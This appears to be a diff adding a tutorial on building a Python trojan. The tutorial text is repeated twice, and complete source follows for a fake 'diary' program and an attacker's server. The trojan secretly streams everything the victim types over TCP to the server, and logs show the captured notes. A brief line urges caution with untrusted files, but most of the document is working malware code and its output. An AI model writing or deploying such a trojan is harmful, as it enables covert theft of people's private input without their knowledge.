@@ -1,0 +1,314 @@
+Our trojan is implemented in the file trojan.py. It tries to collect data from the victim disquised as a common diary and send them secretly to the server of the attacker. The server is implemented in the file server.py. We should be able to see all notes written into the diary without any knowledge of the victim.
+
+Demonstration of behavior
+The first thing that the attacker must do is to set a server that collects data sent by the victim. That's why we setup a running server on our computer by running ./server.py. You should see the following text:
+
+DEBUG:user:Server was successfully initialized.
+In the second console run the trojan (diary) as the victim with the command ./trojan.py. On the attacker's console we should immediately see the following text:
+
+Connection with trojan established from ('127.0.0.1', 46682)
+That means that our client has made a successful connection to our server. Type a few lines of notes into the diary. We can observe that all notes are being shown to the attacker as well.
+
+What does the victim see
+Hello, this is your diary. You can type here your notes:
+Hello diary,
+let me tell you a secret.
+...
+What does the attacker see
+DEBUG:user:Server was successfully initialized.
+Connection with trojan established from ('127.0.0.1', 46682)
+INFO:user:b'Hello diary,\n'
+INFO:user:b'let me tell you a secret.\n'
+...
+Creation of basic trojan is very simple process as it is described below and anyone can do it just with the basic knowledge of programming and understandment of operating systems. That's why we should be always cautious when we execute any uncommon or not trusted file.
+
+How does it work?
+Server
+Firstly, we create our server that should collect the data obtained from trojan executed by the victim. The server will listen on the specific port that must be the same as is specified in our trojan. In this example will be both the server and trojan executed on the same computer, but the server might be remote and located anywhere in the world.
+
+server = Server(27000)
+The communication is realized via TCP protocol specified by socket.SOCK_STREAM (To learn more about network protocols see the guide to network communication.
+
+self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+Then we must initialize the server by binding it to the specified port.
+
+server.initialize()
+The most important part is the connection with the victim. This is implemented in the function collect_data provided by the server. It waits for the connection initiated by the trojan after its execution on the victim's system. After that it just constantly checks whether the client has sent any data. If so, they are logged into the console so that the attacker can see them. If the sent data are "empty", the client has closed the connection.
+
+while True:
+    data = connection.recv(1024)
+    if not data:
+        break
+    logging.debug(data)
+Trojan (client)
+Firstly, we must create our trojan. The service requires a name of the host (server) and the specified port for the communication. Host named localhost means that the server is listening on the same system as our client.
+
+trojan = Trojan('localhost', 27000)
+Now we try to connect to the server. This connection should remain hidden to the victim. The logging message is presented just so we can spot any errors in our example.
+
+try:
+    self.socket.connect((self.host, self.port))
+except socket.error:
+    logging.debug('Trojan could not connect to the server.')
+    return
+Then the trojan tries to act like a harmless program by greeting the victim.
+
+print('Hello, this is your diary. You can type your notes here:')
+As the victim types his or her notes into the diary (stdin), each line is sent to the attacker's server. We expect the data to be encoded as UTF-8 and because the communication interface expects binary data, we must transform the obtained strings into bytes.
+
+while True:
+    character = sys.stdin.read(1)
+    self.socket.send(bytes(character, 'utf-8'))
+
+
+
+
+
+
+
+//Trojan
+
+
+Our trojan is implemented in the file trojan.py. It tries to collect data from the victim disquised as a common diary and send them secretly to the server of the attacker. The server is implemented in the file server.py. We should be able to see all notes written into the diary without any knowledge of the victim.
+
+Demonstration of behavior
+The first thing that the attacker must do is to set a server that collects data sent by the victim. That's why we setup a running server on our computer by running ./server.py. You should see the following text:
+
+DEBUG:user:Server was successfully initialized.
+In the second console run the trojan (diary) as the victim with the command ./trojan.py. On the attacker's console we should immediately see the following text:
+
+Connection with trojan established from ('127.0.0.1', 46682)
+That means that our client has made a successful connection to our server. Type a few lines of notes into the diary. We can observe that all notes are being shown to the attacker as well.
+
+What does the victim see
+Hello, this is your diary. You can type here your notes:
+Hello diary,
+let me tell you a secret.
+...
+What does the attacker see
+DEBUG:user:Server was successfully initialized.
+Connection with trojan established from ('127.0.0.1', 46682)
+INFO:user:b'Hello diary,\n'
+INFO:user:b'let me tell you a secret.\n'
+...
+Creation of basic trojan is very simple process as it is described below and anyone can do it just with the basic knowledge of programming and understandment of operating systems. That's why we should be always cautious when we execute any uncommon or not trusted file.
+
+How does it work?
+Server
+Firstly, we create our server that should collect the data obtained from trojan executed by the victim. The server will listen on the specific port that must be the same as is specified in our trojan. In this example will be both the server and trojan executed on the same computer, but the server might be remote and located anywhere in the world.
+
+server = Server(27000)
+The communication is realized via TCP protocol specified by socket.SOCK_STREAM (To learn more about network protocols see the guide to network communication.
+
+self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+Then we must initialize the server by binding it to the specified port.
+
+server.initialize()
+The most important part is the connection with the victim. This is implemented in the function collect_data provided by the server. It waits for the connection initiated by the trojan after its execution on the victim's system. After that it just constantly checks whether the client has sent any data. If so, they are logged into the console so that the attacker can see them. If the sent data are "empty", the client has closed the connection.
+
+while True:
+    data = connection.recv(1024)
+    if not data:
+        break
+    logging.debug(data)
+Trojan (client)
+Firstly, we must create our trojan. The service requires a name of the host (server) and the specified port for the communication. Host named localhost means that the server is listening on the same system as our client.
+
+trojan = Trojan('localhost', 27000)
+Now we try to connect to the server. This connection should remain hidden to the victim. The logging message is presented just so we can spot any errors in our example.
+
+try:
+    self.socket.connect((self.host, self.port))
+except socket.error:
+    logging.debug('Trojan could not connect to the server.')
+    return
+Then the trojan tries to act like a harmless program by greeting the victim.
+
+print('Hello, this is your diary. You can type your notes here:')
+As the victim types his or her notes into the diary (stdin), each line is sent to the attacker's server. We expect the data to be encoded as UTF-8 and because the communication interface expects binary data, we must transform the obtained strings into bytes.
+
+while True:
+    character = sys.stdin.read(1)
+    self.socket.send(bytes(character, 'utf-8'))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#!/usr/bin/env python3
+
+""" Implementation of the server that collects data sent by trojan.
+"""
+
+import logging
+import socket
+
+
+class Server:
+    """ This class represents a server of the attacker that
+    collects data from the victim.
+    """
+
+    def __init__(self, port):
+        self._port = port
+        # Initialize the socket for connection.
+        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    @property
+    def port(self):
+        """ Port, on which the server runs (`int`). """
+        return self._port
+
+    @port.setter
+    def port(self, new_port):
+        self._port = new_port
+
+    @property
+    def socket(self):
+        """ Server socket. """
+        return self._socket
+
+    def initialize(self):
+        """ Initialize server before session. """
+        try:
+            self.socket.bind(('localhost', self._port))
+            self.socket.listen()
+            logging.debug('Server was successfully initialized.')
+        except socket.error:
+            print('Server was not initialized due to an error.')
+
+    def collect_data(self):
+        """ Collect data from client trojan application. """
+        # Establish a connection with the victim.
+        connection, address = self.socket.accept()
+        with connection:
+            print('Connection with trojan established from {}'.format(address))
+
+            # Receive data sent by trojan diary.
+            while True:
+                data = connection.recv(1024)
+                if not data:
+                    break
+                logging.info(data)
+
+
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.DEBUG)
+
+    # Create and initialize a server running on attacker's side.
+    server = Server(27000)
+    server.initialize()
+    # Collect the data sent by trojan that was executed on victim's side.
+    server.collect_data()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#!/usr/bin/env python3
+
+""" Implementation of trojan that collects data and sends them to server.
+    It acts like an ordinary diary.
+"""
+
+import logging
+import socket
+import sys
+
+
+class Trojan:
+    """ This class represents the implementation of trojan disguised
+        as diary.
+    """
+
+    def __init__(self, host, port):
+        self._host = host
+        self._port = port
+        # Initialize socket for the connection.
+        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    @property
+    def host(self):
+        """ Server that collects obtained data. """
+        return self._host
+
+    @host.setter
+    def host(self, new_host):
+        self._host = new_host
+
+    @property
+    def port(self):
+        """ Port, on which the server runs (`int`). """
+        return self._port
+
+    @port.setter
+    def port(self, new_port):
+        self._port = new_port
+
+    @property
+    def socket(self):
+        """ Client socket. """
+        return self._socket
+
+    def collect_data(self):
+        """ Secretly collect data and send them to server. """
+        # Create a connection to the server.
+        try:
+            self.socket.connect((self.host, self.port))
+        except socket.error:
+            logging.debug('Trojan could not connect to the server.')
+            return
+
+        # Try to act as an ordinary diary.
+        print('Hello, this is your diary. You can type here your notes: ')
+
+        # Read notes written by the victim and send them to the server.
+        while True:
+            character = sys.stdin.read(1)
+            self.socket.send(bytes(character, 'utf-8'))
+
+
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.DEBUG)
+
+    # Initialize trojan application that acts like an diary.
+    trojan = Trojan('localhost', 27000)
+    # Collect the data and send them to the server running
+    # on the attacket's side.
+    trojan.collect_data()
+
+
+
+
+
+
+
+
+
+
+
